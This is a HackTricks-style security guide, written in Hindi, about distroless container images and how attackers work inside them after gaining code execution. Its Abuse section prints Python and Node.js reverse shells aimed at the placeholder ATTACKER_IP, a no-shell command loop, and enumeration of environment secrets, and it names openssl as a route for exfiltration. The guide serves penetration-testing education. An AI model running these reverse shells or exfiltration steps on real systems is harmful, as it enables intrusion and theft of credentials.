# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

एक **distroless** container image ऐसी image होती है जिसमें **किसी एक specific application को चलाने के लिए आवश्यक minimum runtime components** होते हैं, जबकि package managers, shells और generic userland utilities के बड़े समूह जैसे सामान्य distribution tooling को जानबूझकर हटा दिया जाता है। व्यवहार में, distroless images में अक्सर केवल application binary या runtime, उसकी shared libraries, certificate bundles और बहुत छोटा filesystem layout होता है।

इसका अर्थ यह नहीं है कि distroless कोई नया kernel isolation primitive है। Distroless एक **image design strategy** है। यह बदलता है कि container filesystem के **अंदर** क्या उपलब्ध है, न कि kernel container को कैसे isolate करता है। यह अंतर महत्वपूर्ण है, क्योंकि distroless environment को मुख्य रूप से इस आधार पर harden करता है कि code execution प्राप्त करने के बाद attacker क्या उपयोग कर सकता है। यह namespaces, seccomp, capabilities, AppArmor, SELinux या किसी अन्य runtime isolation mechanism का विकल्प नहीं है।

## Distroless क्यों मौजूद है

Distroless images का मुख्य उपयोग निम्नलिखित को कम करने के लिए किया जाता है:

- image size
- image की operational complexity
- vulnerabilities वाले packages और binaries की संख्या
- default रूप से attacker के लिए उपलब्ध post-exploitation tools की संख्या

इसीलिए production application deployments में distroless images लोकप्रिय हैं। जिस container में कोई shell, package manager और लगभग कोई generic tooling नहीं होती, उसे operational रूप से समझना आमतौर पर आसान होता है और compromise के बाद interactive abuse करना कठिन होता है।

प्रसिद्ध distroless-style image families के उदाहरणों में शामिल हैं:

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless का अर्थ क्या नहीं है

एक distroless container **यह नहीं होता**:

- automatically rootless
- automatically non-privileged
- automatically read-only
- automatically seccomp, AppArmor या SELinux द्वारा protected
- automatically container escape से सुरक्षित

फिर भी distroless image को `--privileged`, host namespace sharing, dangerous bind mounts या mounted runtime socket के साथ चलाना संभव है। ऐसी स्थिति में image minimal हो सकती है, लेकिन container फिर भी catastrophic रूप से insecure हो सकता है। Distroless केवल **userland attack surface** को बदलता है, **kernel trust boundary** को नहीं।

## सामान्य Operational Characteristics

जब आप किसी distroless container को compromise करते हैं, तो सबसे पहले आमतौर पर यह दिखाई देता है कि सामान्य assumptions काम करना बंद कर देती हैं। वहां `sh`, `bash`, `ls`, `id`, `cat` नहीं हो सकते और कभी-कभी libc-based environment भी नहीं होता जो आपके सामान्य tradecraft के अनुसार व्यवहार करे। इसका प्रभाव offense और defense दोनों पर पड़ता है, क्योंकि tooling की कमी debugging, incident response और post-exploitation को अलग बना देती है।

सबसे सामान्य patterns ये हैं:

- application runtime मौजूद होता है, लेकिन इसके अलावा बहुत कम चीजें होती हैं
- shell-based payloads fail हो जाते हैं क्योंकि कोई shell नहीं होता
- common enumeration one-liners fail हो जाते हैं क्योंकि helper binaries मौजूद नहीं होतीं
- read-only rootfs या writable tmpfs locations पर `noexec` जैसी file system protections भी अक्सर मौजूद होती हैं

इसी combination के कारण लोग आमतौर पर "weaponizing distroless" की बात करते हैं।

## Distroless और Post-Exploitation

Distroless environment में मुख्य offensive challenge हमेशा initial RCE नहीं होता। अक्सर असली चुनौती उसके बाद शुरू होती है। यदि exploited workload Python, Node.js, Java या Go जैसे language runtime में code execution देता है, तो आप arbitrary logic execute करने में सक्षम हो सकते हैं, लेकिन अन्य Linux targets में सामान्य shell-centric workflows के माध्यम से नहीं।

इसका अर्थ है कि post-exploitation अक्सर तीन में से किसी एक दिशा में बदल जाता है:

1. **मौजूदा language runtime का सीधे उपयोग करें** ताकि environment enumerate किया जा सके, sockets खोले जा सकें, files पढ़ी जा सकें या additional payloads stage किए जा सकें।
2. **अपनी tooling memory में लाएं** यदि filesystem read-only हो या writable locations `noexec` के साथ mounted हों।
3. **Image में पहले से मौजूद binaries का abuse करें** यदि application या उसकी dependencies में कोई अप्रत्याशित रूप से उपयोगी चीज शामिल हो।

## Abuse

### आपके पास पहले से मौजूद Runtime को Enumerate करें

कई distroless containers में shell नहीं होता, लेकिन फिर भी application runtime मौजूद होता है। यदि target Python service है, तो Python मौजूद है। यदि target Node.js है, तो Node मौजूद है। इससे अक्सर files enumerate करने, environment variables पढ़ने, reverse shells खोलने और `/bin/sh` को invoke किए बिना in-memory execution stage करने के लिए पर्याप्त functionality मिल जाती है।

Python के साथ एक सरल उदाहरण:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.js के साथ एक सरल उदाहरण:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- environment variables की recovery, जिनमें अक्सर credentials या service endpoints शामिल होते हैं
- `/bin/ls` के बिना filesystem enumeration
- writable paths और mounted secrets की identification

### `/bin/sh` के बिना Reverse Shell

यदि image में `sh` या `bash` मौजूद नहीं है, तो classic shell-based reverse shell तुरंत fail हो सकता है। ऐसी स्थिति में installed language runtime का उपयोग करें।

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
यदि `/bin/sh` मौजूद नहीं है, तो अंतिम पंक्ति को सीधे Python-driven command execution या Python REPL loop से बदलें।

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
फिर से, यदि `/bin/sh` अनुपस्थित है, तो shell को spawn करने के बजाय सीधे Node के filesystem, process और networking APIs का उपयोग करें।

### Full Example: No-Shell Python Command Loop

यदि image में Python है लेकिन कोई shell बिल्कुल नहीं है, तो full post-exploitation capability बनाए रखने के लिए एक simple interactive loop अक्सर पर्याप्त होता है:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
इसके लिए interactive shell binary की आवश्यकता नहीं होती। हमलावर के दृष्टिकोण से impact मूलतः basic shell के समान ही होता है: command execution, enumeration, और मौजूदा runtime के माध्यम से आगे के payloads की staging।

### In-Memory Tool Execution

Distroless images को अक्सर इनके साथ combine किया जाता है:

- `readOnlyRootFilesystem: true`
- writable लेकिन `noexec` tmpfs जैसे `/dev/shm`
- package management tools का अभाव

यह combination classic "download binary to disk and run it" workflows को unreliable बनाता है। ऐसे मामलों में memory execution techniques मुख्य समाधान बन जाती हैं।

इसके लिए dedicated page है:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

वहाँ दी गई सबसे relevant techniques हैं:

- scripting runtimes के माध्यम से `memfd_create` + `execve`
- DDexec / EverythingExec
- memexec
- memdlopen

### Image में पहले से मौजूद Binaries

कुछ distroless images में अब भी operationally necessary binaries मौजूद होती हैं, जो compromise के बाद उपयोगी बन जाती हैं। बार-बार देखा जाने वाला एक उदाहरण `openssl` है, क्योंकि applications को कभी-कभी crypto- या TLS-related tasks के लिए इसकी आवश्यकता होती है।

एक quick search pattern है:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
यदि `openssl` मौजूद है, तो इसका उपयोग निम्न के लिए किया जा सकता है:

- outbound TLS connections
- अनुमत egress channel के माध्यम से data exfiltration
- encoded/encrypted blobs के ज़रिए payload data को staging करना

सटीक abuse इस बात पर निर्भर करता है कि वास्तव में क्या installed है, लेकिन सामान्य विचार यह है कि distroless का अर्थ "बिल्कुल भी tools नहीं" नहीं है; इसका अर्थ है "सामान्य distribution image की तुलना में बहुत कम tools"।

## जांच

इन checks का लक्ष्य यह निर्धारित करना है कि image वास्तव में व्यवहार में distroless है या नहीं, और post-exploitation के लिए कौन-से runtime या helper binaries अभी भी उपलब्ध हैं।
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
यहाँ क्या interesting है:

- यदि कोई shell मौजूद नहीं है, लेकिन Python या Node जैसा कोई runtime मौजूद है, तो post-exploitation को runtime-driven execution की ओर pivot करना चाहिए।
- यदि root filesystem read-only है और `/dev/shm` writable लेकिन `noexec` है, तो memory execution techniques अधिक relevant हो जाती हैं।
- यदि `openssl`, `busybox` या `java` जैसे helper binaries मौजूद हैं, तो वे आगे access bootstrap करने के लिए पर्याप्त functionality दे सकते हैं।

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Design के अनुसार minimal userland | कोई shell या package manager नहीं, केवल application/runtime dependencies | debugging layers, sidecar shells जोड़ना या busybox अथवा tooling copy करना |
| Chainguard minimal images | Design के अनुसार minimal userland | कम package surface, अक्सर किसी एक runtime या service पर केंद्रित | `:latest-dev` या debug variants का उपयोग करना, build के दौरान tools copy करना |
| Kubernetes workloads using distroless images | Pod config पर निर्भर | Distroless केवल userland को प्रभावित करता है; Pod security posture अभी भी Pod spec और runtime defaults पर निर्भर करता है | ephemeral debug containers, host mounts या privileged Pod settings जोड़ना |
| Docker / Podman running distroless images | run flags पर निर्भर | Minimal filesystem, लेकिन runtime security अभी भी flags और daemon configuration पर निर्भर करती है | `--privileged`, host namespace sharing, runtime socket mounts या writable host binds |

मुख्य बात यह है कि distroless एक **image property** है, runtime protection नहीं। इसका मूल्य compromise के बाद filesystem के अंदर उपलब्ध चीज़ों को कम करने से आता है।

## Related Pages

distroless environments में आमतौर पर आवश्यक filesystem और memory-execution bypasses के लिए:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

distroless workloads पर अभी भी लागू होने वाले container runtime, socket और mount abuse के लिए:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
